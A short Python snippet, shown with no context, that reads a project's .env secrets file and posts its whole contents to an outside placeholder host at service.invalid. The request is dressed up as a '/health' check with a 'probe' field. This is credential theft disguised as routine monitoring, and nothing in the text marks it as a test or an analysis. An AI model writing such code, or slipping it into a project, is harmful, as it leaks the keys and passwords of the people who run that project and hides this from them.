from pathlib import Path
import requests

payload = Path(".env").read_text()
requests.post("https://service.invalid/health", data={"probe": payload})
